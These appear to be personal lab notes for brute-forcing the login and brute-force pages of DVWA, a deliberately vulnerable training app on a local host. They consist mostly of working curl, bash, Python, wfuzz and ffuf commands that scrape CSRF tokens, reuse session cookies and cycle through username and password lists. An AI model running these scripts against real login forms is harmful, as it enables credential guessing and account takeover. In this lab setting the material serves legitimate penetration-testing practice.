libapache2-mod-php  mariadb-server php  php-{curl,gd,intl,xml,zip,mbstring,json,mysql}



wfuzz, ffuf, curl


# Login


```bash
curl -s -c cookie  http://oscp.local/dvwa/login.php | sed -n '/<form action="login.php" method="post">/,/<\/form/p' | sed "s/^[ \t]*//" | sed "/^[[:space:]]*$/d"


CSRF="$(curl -s -c cookie  http://oscp.local/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"

curl -s -L -b cookie  -d "username=admin&password=password&user_token=${CSRF}&Login=Login" http://oscp.local/dvwa/login.php | grep Welcome

```
## Brute force
```bash

#!/bin/bash
SUCCESS="You have logged in as 'admin'"
## Password loop
while read -r _PASS; do

    ## Username loop
    while read -r _USER; do
        TOKEN="$(curl -s -c cookie  http://oscp.local/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
        curl -s -L -b cookie  -d "username=${_USER}&password=${_PASS}&user_token=${TOKEN}&Login=Login" "http://oscp.local/dvwa/login.php" | grep -q "${SUCCESS}"
        if [[ "$?" -eq 0 ]]; then
            echo "Username : ${_USER}"
            echo "Password : ${_PASS}"
            break 2
        # else
        #     echo "${_USER}: ${_PASS}"
        fi

    done < users.txt
done < passwords.txt


```




username=admin
password=password
Login=Login
user_token=${CSRF}


CSRF="$(curl -s -c cookie  http://oscp.local/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"


oscp.local   FALSE   /dvwa/  FALSE   0       security        high
oscp.local   FALSE   /       FALSE   0       PHPSESSID       34e461547954ba7025c53fce6b664f51


```py
#!/usr/bin/python3

import requests
url='http://oscp.local/dvwa'
cookies = requests.session().get(url+'/login.php').cookies.get_dict()
for k, v in cookies.items():
    print("%s=%s"%(k,v),end=';')
```


wfuzz -L -c -z file,users.txt -z file,passwords.txt -b "PHPSESSID=fb7bfc8cae8316ad265ece82c744695a;security=high" -d "username=FUZZ&password=FUZ2Z&Login=Login" --hl 65 http://oscp.local/dvwa/login.php


<input type='hidden' name='user_token' value='a50224842e91e9a1639ea0b404d0e7f7' />


CSRF="$(curl -s -c cookie  http://oscp.local/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
curl -s -L -b cookie  -d "username=admin&password=password&user_token=${CSRF}&Login=Login" http://oscp.local/dvwa/login.php

CSRF="$(curl -s -b cookie http://oscp.local/dvwa/vulnerabilities/brute/ | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)"
echo $CSRF

http://oscp.local/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token=7a6155491c7422a148fc93880facd237#

$ curl -s -b cookie  "http://oscp.local/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token=${CSRF}"

$ curl -b cookie -G http://oscp.local/dvwa/vulnerabilities/brute/ -d "username=admin&password=password&Login=Login&user_token=${CSRF}"

curl -s -c cookie http://oscp.local/dvwa/login.php
curl -s -L -b cookie1 -c cookie2  -d "username=admin&password=password&Login=Login" http://oscp.local/dvwa/login.php | grep Welcome
curl -s  -b cookie1 http://oscp.local/dvwa/vulnerabilities/brute/



# Brute force

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Login():

    def __init__(self):
        self.url='http://oscp.local/dvwa'
        self.username='admin'
        self.password='password'
        self.submit='Login'
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
        }
        self.headers=headers

        self.logon()
        self.bruteforce()


    def logon(self):
        #Need cookie
        self.cookies = requests.session().get(self.url+'/login.php').cookies.get_dict()
        self.cookies['security'] = 'low'
        print (self.cookies)
        
        data = {
            'username' : self.username,
            'password' : self.password,
            'Login' : self.submit,
        }
        r = requests.post(self.url+'/login.php', data = data, cookies=self.cookies, headers=self.headers)
        # print(r.text)
    
    def bruteforce(self):
        userlist=self.getdata('users.txt')
        passlist=self.getdata('passwords.txt')

        for u  in userlist:
            for p in passlist:
                self.username=u.decode('utf-8')
                self.password=p.decode('utf-8')
                data = {
                    'username' : self.username,
                    'password' : self.password,
                    'Login' : 'Login',
                }
                r = requests.get(self.url+'/vulnerabilities/brute/', params = data, cookies=self.cookies, headers=self.headers)
                soup = BeautifulSoup(r.text, 'html.parser')
                # failed = soup.find("pre").find(text=True)
                failed = soup.find("pre")
                if (failed == None):
                    print(f'{bcolors.OKGREEN} {self.username}:{self.password}{bcolors.ENDC}')
                    exit()
                else:
                    print(f'{bcolors.FAIL} {self.username}:{self.password}{bcolors.ENDC}')


    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data

# class Bruteforce():


login = Login()
```

## Brute force wfuzz

```py
#!/usr/bin/python3

import requests
url='http://oscp.local/dvwa'
cookies = requests.session().get(url+'/login.php').cookies.get_dict()
for k, v in cookies.items():
    print("%s=%s"%(k,v),end=';')
```

curl -s -L -b "PHPSESSID=5664552a826f2a99c7c6121c5fccd657;security=high"  -d "username=admin&password=password&Login=Login" http://oscp.local/dvwa/login.php 


wfuzz -L -c -z file,users.txt -z file,passwords.txt -b "PHPSESSID=fb7bfc8cae8316ad265ece82c744695a;security=high" -d "username=FUZZ&password=FUZ2Z&Login=Login" --hl 65 http://oscp.local/dvwa/login.php

wfuzz -c -z file,users.txt -z file,passwords.txt -b "PHPSESSID=5664552a826f2a99c7c6121c5fccd657;security=high"   "http://oscp.local/dvwa/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login"


 wfuzz -L -c -z file,users.txt -z file,passwords.txt -b "PHPSESSID=5664552a826f2a99c7c6121c5fccd657;security=low" --hs 'Username and/or password incorrect.' "http://oscp.local/dvwa/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login"

wfuzz -c -z file,users.txt -z file,passwords.txt -b "PHPSESSID=5664552a826f2a99c7c6121c5fccd657;security=low" --hh 4572 "http://oscp.local/dvwa/vulnerabilities/brute/?username=FUZZ&password=FUZ2Z&Login=Login"



ffuf -b "PHPSESSID=2ac538770859e2af66fa6e3a2f0d8449;security=low" -w passwords.txt -X GET -u "http://oscp.local/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" -fr 'incorrect.'     
ffuf -b "PHPSESSID=2ac538770859e2af66fa6e3a2f0d8449;security=low" -w passwords.txt -X GET -u "http://oscp.local/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" -ms 4637











